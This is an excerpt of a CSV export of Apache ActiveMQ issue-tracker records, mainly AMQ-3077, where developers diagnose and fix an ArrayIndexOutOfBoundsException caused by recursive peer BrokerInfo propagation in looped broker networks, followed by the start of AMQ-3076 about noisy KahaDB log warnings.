updateURIsSupported, default: true. Description: Whether the client should accept updates to its list of URIs from the broker.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74735,,,Thu Dec 09 23:47:26 UTC 2010,,,,,,,,,,,"0|i0s2xj:",161951,,,,,,,,,,,,,,,,,,,,,"09/Dec/10 23:47;tabish;Fixed, changes will be reflected once the site is updated.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"ArraysIndexOutOfBoundsException : -32768 in ""BrokerService[xxx] Task"" thread",AMQ-3077,12492805,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,eric-awl,eric-awl,09/Dec/10 08:52,15/Mar/11 08:02,14/Jul/23 05:43,13/Jan/11 14:26,5.4.0,5.4.1,,,,5.5.0,,,Broker,,,,0,,,,,,,,,"Exception in thread ""BrokerService[SUP-tterdp31v] Task"" java.lang.ArrayIndexOutOfBoundsException: -32767
        at org.apache.activemq.openwire.BooleanStream.writeBoolean(BooleanStream.java:54)
        at org.apache.activemq.openwire.OpenWireFormat.tightMarshalNestedObject1(OpenWireFormat.java:377)
        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalNestedObject1(BaseDataStreamMarshaller.java:131)
        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalObjectArray1(BaseDataStreamMarshaller.java:357)
        at org.apache.activemq.openwire.v6.BrokerInfoMarshaller.tightMarshal1(BrokerInfoMarshaller.java:106)
        at org.apache.activemq.openwire.OpenWireFormat.tightMarshalNestedObject1(OpenWireFormat.java:397)
        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalNestedObject1(BaseDataStreamMarshaller.java:131)
        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalObjectArray1(BaseDataStreamMarshaller.java:357)
        at org.apache.activemq.openwire.v6.BrokerInfoMarshaller.tightMarshal1(BrokerInfoMarshaller.java:106)
        at org.apache.activemq.openwire.OpenWireFormat.tightMarshalNestedObject1(OpenWireFormat.java:397)
        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalNestedObject1(BaseDataStreamMarshaller.java:131)
        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalObjectArray1(BaseDataStreamMarshaller.java:357)
        at org.apache.activemq.openwire.v6.BrokerInfoMarshaller.tightMarshal1(BrokerInfoMarshaller.java:106)
        at org.apache.activemq.openwire.OpenWireFormat.tightMarshalNestedObject1(OpenWireFormat.java:397)
        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalNestedObject1(BaseDataStreamMarshaller.java:131)
        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalObjectArray1(BaseDataStreamMarshaller.java:357)
        at org.apache.activemq.openwire.v6.BrokerInfoMarshaller.tightMarshal1(BrokerInfoMarshaller.java:106)
        at org.apache.activemq.openwire.OpenWireFormat.tightMarshalNestedObject1(OpenWireFormat.java:397)
        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalNestedObject1(BaseDataStreamMarshaller.java:131)
        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalObjectArray1(BaseDataStreamMarshaller.java:357)
        at org.apache.activemq.openwire.v6.BrokerInfoMarshaller.tightMarshal1(BrokerInfoMarshaller.java:106)
        at org.apache.activemq.openwire.OpenWireFormat.tightMarshalNestedObject1(OpenWireFormat.java:397)
        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalNestedObject1(BaseDataStreamMarshaller.java:131)
        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalObjectArray1(BaseDataStreamMarshaller.java:357)
        at org.apache.activemq.openwire.v6.BrokerInfoMarshaller.tightMarshal1(BrokerInfoMarshaller.java:106)
        at org.apache.activemq.openwire.OpenWireFormat.tightMarshalNestedObject1(OpenWireFormat.java:397)
        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalNestedObject1(BaseDataStreamMarshaller.java:131)
        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalObjectArray1(BaseDataStreamMarshaller.java:357)
        at org.apache.activemq.openwire.v6.BrokerInfoMarshaller.tightMarshal1(BrokerInfoMarshaller.java:106)
        at org.apache.activemq.openwire.OpenWireFormat.tightMarshalNestedObject1(OpenWireFormat.java:397)
        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalNestedObject1(BaseDataStreamMarshaller.java:131)
        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalObjectArray1(BaseDataStreamMarshaller.java:357)
        at org.apache.activemq.openwire.v6.BrokerInfoMarshaller.tightMarshal1(BrokerInfoMarshaller.java:106)
        at org.apache.activemq.openwire.OpenWireFormat.marshal(OpenWireFormat.java:228)
        at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:181)
        at org.apache.activemq.transport.InactivityMonitor.oneway(InactivityMonitor.java:255)
        at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:85)
        at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:104)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)
        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1249)
        at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:810)
        at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:846)
        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:619)

Today this exception is not written in ActiveMQ logs but on the standard output. 
It seems that happens when network of brokers connections are stopped, but I'm not sure at all. (the number of ""bridge to ... stopped"" seems to be the same as the number of Exceptions detected)

So I need to dig into this problem to be more precise.

Eric-AWL","Linux, Java 6, Fuse Message Brokers 5.4.0-1 or 5.4.1-1",artnaseef,eric-awl,johnkidd,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2632,,,,,,,,,,,,,,,,,,,,"20/Dec/10 13:23;eric-awl;NetworkOfTwentyBrokersTest.java;https://issues.apache.org/jira/secure/attachment/12466628/NetworkOfTwentyBrokersTest.java","20/Dec/10 13:23;eric-awl;TransportConnection.java;https://issues.apache.org/jira/secure/attachment/12466626/TransportConnection.java","20/Dec/10 13:23;eric-awl;TransportConnector.java;https://issues.apache.org/jira/secure/attachment/12466627/TransportConnector.java","17/Dec/10 09:21;eric-awl;activemq_SIBBusModule.xml;https://issues.apache.org/jira/secure/attachment/12466453/activemq_SIBBusModule.xml","17/Dec/10 09:21;eric-awl;activemq_SIBBusSupervisor.xml;https://issues.apache.org/jira/secure/attachment/12466454/activemq_SIBBusSupervisor.xml","17/Dec/10 09:21;eric-awl;activemq_Serveur.xml;https://issues.apache.org/jira/secure/attachment/12466452/activemq_Serveur.xml","16/Dec/10 15:45;eric-awl;bsm.log;https://issues.apache.org/jira/secure/attachment/12466389/bsm.log",,,,,,,,,,,,,,,7.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14705,,,Tue Mar 15 08:02:09 UTC 2011,,,,,,,,,,,"0|i0agxj:",59016,,,,,,,,,,,,,,,,,,,,,"09/Dec/10 10:16;elisa41;I confirm that, into each broker experiencing java.lang.ArrayIndexOutOfBoundsException, there is as much number of exceptions as number of ""bridge to ... stopped"" messages.;;;","10/Dec/10 09:22;eric-awl;Since I see a lot of ""imbrications"" of 

at org.apache.activemq.openwire.OpenWireFormat.tightMarshalNestedObject1(OpenWireFormat.java:397)
        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalNestedObject1(BaseDataStreamMarshaller.java:131)
        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalObjectArray1(BaseDataStreamMarshaller.java:357)
        at org.apache.activemq.openwire.v6.BrokerInfoMarshaller.tightMarshal1(BrokerInfoMarshaller.java:106)

perhaps a ""short"" usage in the BooleanStream.writeBoolean is not enough to manage complexity of the message sent ?

public void writeBoolean(boolean value) throws IOException {
        if (bytePos == 0) {
            arrayLimit++;
            if (arrayLimit >= data.length) {
                // re-grow the array.
                byte d[] = new byte[data.length * 2];
                System.arraycopy(data, 0, d, 0, data.length);
                data = d;
            }
        }
        if (value) {
            data[arrayPos] |= 0x01 << bytePos;
        }
        bytePos++;
        if (bytePos >= 8) {
            bytePos = 0;
            arrayPos++;
        }
    }


            data[arrayPos] |= 0x01 << bytePos;

arrayPos would become too big and reached 32768 limit of the ""short usage"" into the BooleanStream object ? (8 * 32768 bits => 262144 individual informations to send)

We are in a complex network of brokers situation  (that will have to be far, far more complex for our needs in the future with more than 1000 servers and 4 imbricated networks of brokers)

Eric-AWL;;;","13/Dec/10 08:41;eric-awl;Here is a Gary Tully's comment added on User discussion forum :

That looks like some concurrent access to the brokerInfos. Can you 
open a jira issue and attach as much relevant info about your setup as 
possible. 

I think the problem is in the 
org.apache.activemq.command.BrokerInfo#copy() method, it does not deep 
copy the brokerInfo array. 

Gary, what happened with ""peerBrokerInfo"" and BrokerInfoMarshaller if one broker A is ""network connected"" on broker B and broker B is connected on broker A  too ? It's our configuration.

eric-AWL

;;;","13/Dec/10 10:04;eric-awl;TransportConnection.java 

start() in 5.4.1

public void start() throws Exception {
        starting = true;
        try {
            synchronized (this) {
                if (taskRunnerFactory != null) {
                    taskRunner = taskRunnerFactory.createTaskRunner(this, ""ActiveMQ Connection Dispatcher: ""
                            + getRemoteAddress());
                } else {
                    taskRunner = null;
                }
                transport.start();
                active = true;
                BrokerInfo info = connector.getBrokerInfo().copy();
                info.setPeerBrokerInfos(this.broker.getPeerBrokerInfos());
                dispatchAsync(info);
                
                connector.onStarted(this);
            }
        } catch (Exception e) {
            // Force clean up on an error starting up.
            stop();
            throw e;
        } finally {
            // stop() can be called from within the above block,
            // but we want to be sure start() completes before
            // stop() runs, so queue the stop until right now:
            starting = false;
            if (pendingStop) {
                LOG.debug(""Calling the delayed stop()"");
                stop();
            }
        }
    }


and start() in 5.3.2

public void start() throws Exception {
        starting = true;
        try {
            synchronized (this) {
                if (taskRunnerFactory != null) {
                    taskRunner = taskRunnerFactory.createTaskRunner(this, ""ActiveMQ Connection Dispatcher: ""
                            + getRemoteAddress());
                } else {
                    taskRunner = null;
                }
                transport.start();
                active = true;
                dispatchAsync(connector.getBrokerInfo());
                connector.onStarted(this);
            }
        } catch (Exception e) {
            // Force clean up on an error starting up.
            stop();
            throw e;
        } finally {
            // stop() can be called from within the above block,
            // but we want to be sure start() completes before
            // stop() runs, so queue the stop until right now:
            starting = false;
            if (pendingStop) {
                LOG.debug(""Calling the delayed stop()"");
                stop();
            }
        }
    }


BrokerInfo info = connector.getBrokerInfo().copy();
info.setPeerBrokerInfos(this.broker.getPeerBrokerInfos());
dispatchAsync(info);

vs

dispatchAsync(connector.getBrokerInfo());


I suspect the difference with what happened in 5.3.2 is here ...        
We are in a configuration with ""no duplex connectors"" where A is connected to B and B is connected to A.

Eric-AWL;;;","14/Dec/10 09:17;eric-awl; public Response processBrokerInfo(BrokerInfo info) {
        if (info.isSlaveBroker()) {
            BrokerService bService = connector.getBrokerService();
            // Do we only support passive slaves - or does the slave want to be
            // passive ?
            boolean passive = bService.isPassiveSlave() || info.isPassiveSlave();
            if (passive == false) {
                
                // stream messages from this broker (the master) to
                // the slave
                MutableBrokerFilter parent = (MutableBrokerFilter) broker.getAdaptor(MutableBrokerFilter.class);
                masterBroker = new MasterBroker(parent, transport);
                masterBroker.startProcessing();
            }
            LOG.info((passive?""Passive"":""Active"")+"" Slave Broker "" + info.getBrokerName() + "" is attached"");
            bService.slaveConnectionEstablished();
        } else if (info.isNetworkConnection() && info.isDuplexConnection()) {
            // so this TransportConnection is the rear end of a network bridge
            // We have been requested to create a two way pipe ...
            try {
                // We first look if existing network connection already exists for the same broker Id
                // It's possible in case of brief network fault to have this transport connector side of the connection always active
                // and the duplex network connector side wanting to open a new one
                // In this case, the old connection must be broken
                BrokerId	remoteBrokerId = info.getBrokerId();
                setDuplexRemoteBrokerId(remoteBrokerId);
                CopyOnWriteArrayList<TransportConnection> connections = this.connector.getConnections();
                for (Iterator<TransportConnection> iter = connections.iterator(); iter.hasNext();) {
            		TransportConnection c = iter.next();
                    if ((c != this) && (remoteBrokerId.equals(c.getDuplexRemoteBrokerId()))) {
                        LOG.warn(""An existing duplex active connection already exists for this broker ("" + remoteBrokerId + ""). Stopping it."");
                        c.stop();
                    }
                }
                Properties properties = MarshallingSupport.stringToProperties(info.getNetworkProperties());
                Map<String, String> props = createMap(properties);
                NetworkBridgeConfiguration config = new NetworkBridgeConfiguration();
                IntrospectionSupport.setProperties(config, props, """");
                config.setBrokerName(broker.getBrokerName());
                URI uri = broker.getVmConnectorURI();
                HashMap<String, String> map = new HashMap<String, String>(URISupport.parseParameters(uri));
                map.put(""network"", ""true"");
                map.put(""async"", ""false"");
                uri = URISupport.createURIWithQuery(uri, URISupport.createQueryString(map));
                Transport localTransport = TransportFactory.connect(uri);
                Transport remoteBridgeTransport = new ResponseCorrelator(transport);
                duplexBridge = NetworkBridgeFactory.createBridge(config, localTransport, remoteBridgeTransport);
                duplexBridge.setBrokerService(broker.getBrokerService());
                // now turn duplex off this side
                info.setDuplexConnection(false);
                duplexBridge.setCreatedByDuplex(true);
                duplexBridge.duplexStart(this, brokerInfo, info);
                LOG.info(""Created Duplex Bridge back to "" + info.getBrokerName());
                return null;
            } catch (TransportDisposedIOException e) {
                LOG.warn(""Duplex Bridge back to "" + info.getBrokerName() + "" was correctly stopped before it was correctly started."");
                return null;
            } catch (Exception e) {
                LOG.error(""Creating duplex network bridge"", e);
            }
        }
        // We only expect to get one broker info command per connection
        if (this.brokerInfo != null) {
            LOG.warn(""Unexpected extra broker info command received: "" + info);
        }
        this.brokerInfo = info;
        broker.addBroker(this, info);
        networkConnection = true;
        List<TransportConnectionState> connectionStates = listConnectionStates();
        for (TransportConnectionState cs : connectionStates) {
            cs.getContext().setNetworkConnection(true);
        }
        return null;
    }


=> broker.addBroker(this, info)

""info"" object seems to become very big in the case of a lot of brokers with a lot of network connections between them . (That's our case !)

Why is it now necessary (since 5.4) for a ""transport connector side"" broker to export already established peer connections to each new ""initator side (network connector)"" broker ?

Eric-AWL;;;","15/Dec/10 08:03;eric-awl;TransportConnection.java 

BrokerInfo info = connector.getBrokerInfo().copy();
info.setPeerBrokerInfos(this.broker.getPeerBrokerInfos());
dispatchAsync(info);


I think it is useful for Openwire v6 ConnectionControl (connectedBrokers). I don't find that ActiveMQ internal process need to know that broker A is connected to B that is connected to C, that is connected to D, that is connected to A .........

info.setPeerBrokerInfos(this.broker.getPeerBrokerInfos()) => Don't we need to break the BrokerInfo recursivity here, and only keep the first level of peerBrokers before sending it to the network connector side ????

We have a lot of brokers that are all connected together in the two ways with not duplex network connection.

Eric-AWL;;;","15/Dec/10 13:08;gtully;yea, at a minimum there should be duplicate detection, only add one that is not already present.

If this is the root of your problem, it should be easy to create a test case that trys to serialize X brokerInfos, this should blow the boolean output stream.

Also, I think the propagation of peer broker infos should be configurable, it is used to let the clients know about the list of alternative brokers, so it should only be gathered if necessary. https://issues.apache.org/jira/browse/AMQ-2632

We need to get some test cases that can demonstrate this problem and can validate and protect the changes when it is fixed.;;;","15/Dec/10 16:47;eric-awl;If I add an algorithm that 
- adds only the first level of peerbrokers in  TransportConnection.start() instead of ""info.setPeerBrokerInfos(this.broker.getPeerBrokerInfos());""
- detects that a peerbroker = current broker in TransportConnection.processBrokerInfo(....) before ""broker.addBroker(this, info);""

Is it always compatible with ""Automatic cluster update and rebalance"" new 5.4 feature ?

(If it is the case, I will try to create specific test case too).

Eric-AWL;;;","15/Dec/10 17:19;gtully;not sure on the first part, the first level restriction, I think that should be configurable because it is topology dependent.

great, patches with tests are always most welcome. There are a few update rebalance feature tests in activemq-core that will protect that feature with your changes. ;;;","16/Dec/10 15:42;eric-awl;mmmhhh.

I just added this into openwire/v6/BrokerInfoMarshaller.java

    public void tightUnmarshal(OpenWireFormat wireFormat, Object o, DataInput dataIn, BooleanStream bs) throws IOException {
        super.tightUnmarshal(wireFormat, o, dataIn, bs);

        BrokerInfo info = (BrokerInfo)o;
        info.setBrokerId((org.apache.activemq.command.BrokerId) tightUnmarsalCachedObject(wireFormat, dataIn, bs));
        info.setBrokerURL(tightUnmarshalString(dataIn, bs));

        if (bs.readBoolean()) {
            short size = dataIn.readShort();
            org.apache.activemq.command.BrokerInfo value[] = new org.apache.activemq.command.BrokerInfo[size];
            for( int i=0; i < size; i++ ) {


                System.out.println(""Nouveau sous-niveau : i = "" + (i+1) +  ""/(size = "" + size + "")"");

                value[i] = (org.apache.activemq.command.BrokerInfo) tightUnmarsalNestedObject(wireFormat,dataIn, bs);

                System.out.println(""Fin du sous-niveau : i = "" + (i+1) +  ""/(size = "" + size + "")"");
            }
            info.setPeerBrokerInfos(value);
        }
        else {
            info.setPeerBrokerInfos(null);
        }

/* Eric Vincent remplacement 3 lignes a la place de la ligne suivante */
        String brokerName = tightUnmarshalString(dataIn, bs);
        System.out.println(""BrokerInfo / BrokerName = "" + brokerName);
        info.setBrokerName(brokerName);

/* Eric Vincent
        info.setBrokerName(tightUnmarshalString(dataIn, bs));
*/
        info.setSlaveBroker(bs.readBoolean());
        info.setMasterBroker(bs.readBoolean());
        info.setFaultTolerantConfiguration(bs.readBoolean());
        info.setDuplexConnection(bs.readBoolean());
        info.setNetworkConnection(bs.readBoolean());
        info.setConnectionId(tightUnmarshalLong(wireFormat, dataIn, bs));
        info.setBrokerUploadUrl(tightUnmarshalString(dataIn, bs));
        info.setNetworkProperties(tightUnmarshalString(dataIn, bs));

    }

And you will find in the log file I put into this thread, what I get with no more than 9 embedded brokers (4 sibBusModule, 1 busSupervisor, 2 servers) on 4 servers (td0sib[01,02][s,v] that are connected togethers with different network of brokers or direct connections.

I think that the current algorithm (without any level constraint) is not good at all for ActiveMQ global scalability.

I will try to change something, but I don't know exactly why it is necessary that each broker knows the global connection hierarchy beyond the first level... And when there are loops, I don't know what could happen ....

Eric-AWL

;;;","16/Dec/10 15:45;eric-awl;the result of the launch of an embedded broker (sibBusModule-TestDeCharge-td0sib01s) 

when ""busModule is alive"", the jms connect to the embedded broker is OK ;;;","17/Dec/10 09:16;eric-awl;I forgot to say that all these brokers are not in the same network of brokers.

SIBBusModules brokers have similar activemq.xml configurations
Serveur brokers have similar activemq.xml configurations
SibBusSupervisor broker has a specific activemq.xml configuration.

;;;","17/Dec/10 09:21;eric-awl;3 activemq.xml attached.;;;","17/Dec/10 09:39;eric-awl;If this important change was made only to provide the ""automatic dynamic failover"" capability, it seems that a new concept (failover brokers with a specific discovery process) should be implemented instead of using standard network of brokers implementation....

Perhaps, it should be better to add a parameter in network of brokers definition, that specify that a network of brokers is dedicated for failover capability, and use a ""ConcurrentHashMap<String, BrokerInfo[]> peerBrokers"" in brokerInfo structure (String = the name of the network of broker) instead of a simple peerBrokers[] array ????

The problem is then completely different....

bsm.log shows us that on a small environment, we can receive a very big ""BrokerInfo"" message with doubles and potential loops. Our production environment is far more complex than this.  I'm quite convinced that it's why we get this ""ArrayOutOfBoundsException"" issue. (We have more than 262000 boolean values to code in the same BrokerInfo structure).

Unfortunately, I will be forced to indicate to production environment that we can not use the 5.4 version. It's a big problem for us, since I already added a patch for duplex network of brokers in 5.3.2 that is now integrated in 5.4 .

Eric-AWL;;;","17/Dec/10 13:06;eric-awl;Is this an acceptable workaround, if I add in TransportConnection.java the condition below :


BrokerInfo info = connector.getBrokerInfo().copy();

if (this.connector.isUpdateClusterClients())
              info.setPeerBrokerInfos(this.broker.getPeerBrokerInfos());

dispatchAsync(info);

and tests it with Maven Tests to verify regressions ?

By this way, if the transport connector is not used for automatic failover purpose (this is the default), it will not export its own peer brokers.

Since I don't use this 5.4 new failover function, I think it will resolve our problem on our complex network of brokers architecture (with exchanges of too big brokerInfo objects), without changing anything for those who now want to use it ...

Eric-AWL;;;","17/Dec/10 13:46;gtully;yes, I think the behavior should be conditional on isUpdateClusterClients, the other place that that condition should be checked is in org.apache.activemq.broker.TransportConnector#getConnectionControl() before the peer brokers are added to the connectedBrokers string, such that the info is only passed to clients if needed.

See previous comment and related issue ref: https://issues.apache.org/jira/browse/AMQ-3077?focusedCommentId=12971673&page=com.atlassian.jira.plugin.system.issuetabpanels%3Acomment-tabpanel#action_12971673

A patch, validated with mvn clean test in activemq-core would be great.

When that feature is enabled, we need to weed out duplicates from the list to ensure the list does not grow in cyclic networks. ;;;","17/Dec/10 14:39;eric-awl;Ok. 

I just changed the 2 places by adding the condition (isUpdateClusterClients()) and did a small test with my own traces. There are no longer a hierarchy of brokerInfo daughter structures, just the connected broker brokerInfo structure brokerName is written on standard output.

I will ask Jean-Marcel to patch our ""big qualify environment"" to validate that there is no longer ArrayOutOfBoundsException .

If maven tests are OK with these 2 small changes, do you consider that these 2 additional conditions will be integrated into future versions without any needs to program a specific new test to demonstrate anymore the problem ?;;;","17/Dec/10 15:49;gtully;a test is the only way to protect your changes into the future. So I think a test is necessary. Think of it as an insurance policy to protect your use case, worth the premium of time that it takes to write.;;;","17/Dec/10 15:55;eric-awl;What is the simplest way to simulate a complex network of brokers situation in a small test ? (one JVM that launches X embedded brokers with one transport connector and the corresponding multicast network connector ?)

Is there an existing JUnit test that I can use as an initial pattern ?;;;","17/Dec/10 18:46;gtully;something like org.apache.activemq.usecases.ThreeBrokerQueueNetworkTest is what you need. There are a bunch of tests that extend org.apache.activemq.JmsMultipleBrokersTestSupport to do that sort of thing.;;;","20/Dec/10 13:23;eric-awl;Patch (TransportConnection.java + TransportConnector.java) + test (20 brokers with specific stop/start);;;","20/Dec/10 13:27;eric-awl;The patch consists in adding 2 conditions (isUpdateClusterClient()) on the BrokerInfo structure sent.

The test consists in
- starting 20 brokers with a transport connector and a network connector in a way all brokers are connected to the 19 other ones.
- stopping the 10 first ones
- restarting the 10 first ones.

Without the patch, the ""arrayOutOfBoundsException"" is raised during the 10 first ones are restarted  (loop ?).

This patch is just a workaround to be compatible with 5.3 version usage, and not a final solution of the identified problem

Eric-AWL;;;","23/Dec/10 11:03;eric-awl;Hi Gary

Do you have some news for me about this problem after I provided a patch and a JUnit Test ? 

Thank you
Eric-AWL;;;","05/Jan/11 08:02;eric-awl;Hi Gary

I wish you an happy new year. How can we progress together on this particular subject ? We use this patch on our test environment, and don't get anymore exceptions.

Eric-AWL;;;","05/Jan/11 10:09;gtully;hny to you too. next step is to review your changes and test, then integrate them. I will hopefully get some time to do this in the next few days.;;;","12/Jan/11 16:34;eric-awl;Hi Gary

No news ?

Eric-AWL;;;","12/Jan/11 16:56;gtully;I was able to reproduce the issue from your test, thanks. I am working on the fix. Part of the problem is that the peer broker info is duplicated on each networked broker. The other issue is that the peerBrokerInfo needs to be cleared before a list of peer brokers is created for propagation to a client or to a peer, as the second level information is not relevant at the moment.
Some of my tests are showing blocking with duplex network connector start and I want to get to the bottom of that before progressing further.;;;","12/Jan/11 17:31;eric-awl;Thank you for your information. I think this will be difficult to fully resolve since automatic failover cluster group concept is ambitious in architecture that is complex as ours  (with loops and a lot of connected brokers in duplex and non duplex).

Don't you think a specific new ""dedicated failover network of brokers"" (with discover mechanism) concept different from ""duplex/non duplex network of brokers"" used for scalability and role isolation, wouldn't be more easier to manage and program (instead of propagating the full network of brokers topology to each broker and associate them all, a role as potential failover broker)  ? So, failover and scalability/isolation problems would be totally distinguished.

All my brokers connected in my different network of brokers, have not the same role. So, in my architecture with a lot of brokers, even if I wanted to use failover, it should be good for me that I could decide by a dedicated discovery rule, what brokers in the global network of brokers, can be chosen as failover broker,and this, for each specific client to broker connection.

Eric-AWL;;;","12/Jan/11 17:50;gtully;I agree. There is a bunch of relevant configuration around the cluster update feature, filters etc and it is configurable per transport connector. Also, the fact that currently the entire topology is propagated is wrong, part of the fix will limit the information to a single level.;;;","13/Jan/11 14:26;gtully;fix in r1058577

Fixed issue with duplication and size of collected peer broker info that was propagated around a network.
In a network a peer is the other end of a network bridge, such that a consumer can connect to it to get a chance at the same destinations. It is not a real peer ( as in a two way association) unless the network is duplex or there is another bridge in the opposite direction.
This is relevant for https://issues.apache.org/jira/browse/AMQ-2632;;;","13/Jan/11 14:28;gtully;RE: Link as part of AMQ-2632: These fixes ensure that transport connector config (setRebalanceClusterClients, setUpdateClusterClients) is respected for cluster updates.
Also of note is the fact that the cluster members respect the oneway nature of a network connector (demand forwarding bridge). ;;;","13/Jan/11 15:50;eric-awl;Hi Gary

Thank you very much.

I don't fully understand. Do you mean, that there is a risk that problems appear with network of brokers with Duplex connections ?

Eric-AWL;;;","13/Jan/11 15:54;gtully;no, what do u not understand?;;;","13/Jan/11 16:23;eric-awl;We use ActiveMQ brokers with complex configuration (now we have around 50 brokers in production on 2 sites for a french electricity provider smart-meter project. Our final goal is between 100 and 1000 brokers on several sites, connected by several different network of brokers).

In some cases, we want to use duplex configuration : when there is an identified ""client broker"" that connects to an ""applicative service provider broker"" (example an ""SMS gateway"" that sends SMS to SMS operator and asynchronously send SMS corresponding notifications to client application) 

And in some other cases, we want to use two single half-duplex configurations (when the two brokers are simultaneously client and provider for some parts of a global applicative service).

My original test only showed that 20 brokers with 2 half-duplex configurations didn't work. The original test didn't try with duplex connections : a loop in peers configuration was created with 2 half-duplex connections, and this loop was the easier way to generate such exception for the test.

In production environment now, we only use 2 half-duplex connections everywhere (for our 50 brokers) with 5.3.2 version. 

We want to be able to use duplex connections, but a bug was discovered with duplex connections and ""not straight"" network outages (we corrected this bug together some months ago). So we looked for a stable 5.4 version ...

We won't use at all failover mechanism since (and to resume), all application has its own embedded broker.

Thank you.
Eric-AWL;;;","13/Jan/11 16:55;gtully;Try a test with duplex connections to be sure, but I think you will be fine now.;;;","14/Jan/11 08:32;eric-awl;Does the 5.5-SNAPSHOT (download page) compiled today (January 14th), include the correction ?;;;","14/Jan/11 09:58;gtully;yes.;;;","30/Jan/11 03:46;johnkidd;we are seeing this issue in production with 5.4.2. We have a network of brokers consisting of about 20 broker instances. What is the side effect of this issue? Lost data? Brokers dropped out of the broker network permanently?

Thanks for any comments.;;;","14/Mar/11 15:06;ratman;Hi guys,
I have the same problem using AMQ 5.4.2 on my production environment.
Is this problem critical? What are the side effects?
I can't use AMQ RC 5.5 in production.
Any suggestions?

Thanks;;;","15/Mar/11 08:02;eric-awl;Hi

The problem could appear if you have a loop in your network of brokers topology. If it is not the case, it is likely that you won't be impacted at all.

Eric-AWL;;;",,,,,,,,,,,,,,,
spurious KahaDB warnings ,AMQ-3076,12492803,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,aivanise,aivanise,09/Dec/10 08:37,09/Dec/10 11:59,14/Jul/23 05:43,09/Dec/10 11:59,5.4.0,5.4.1,5.4.2,,,5.5.0,,,Message Store,,,,0,,,,,,,,,"
please reduce to DEBUG or remove alltogether, see discussion from the mailing list below

thanks.

2010-12-09 09:31:46,613 | WARN  | KahaDB PageFile flush: 3 queued writes, latch wait took 142 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker
2010-12-09 09:32:52,240 | WARN  | KahaDB PageFile flush: 3 queued writes, latch wait took 117 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker
2010-12-09 09:32:57,377 | WARN  | KahaDB PageFile flush: 3 queued writes, latch wait took 116 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker
2010-12-09 09:34:03,052 | WARN  | KahaDB PageFile flush: 3 queued writes, latch wait took 111 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker
2010-12-09 09:34:08,276 | WARN  | KahaDB PageFile flush: 3 queued writes, latch wait took 202 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker
2010-12-09 09:34:53,207 | WARN  | KahaDB PageFile flush: 3 queued writes, latch wait took 208 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker
2010-12-09 09:35:28,377 | WARN  | KahaDB PageFile flush: 3 queued writes, latch wait took 283 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker



From: Gary Tully <gary.tully-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
Subject: Re: KahaDB latch wait warnings
Newsgroups: gmane.comp.java.activemq.user
Date: Wed, 8 Dec 2010 15:24:00 +0000

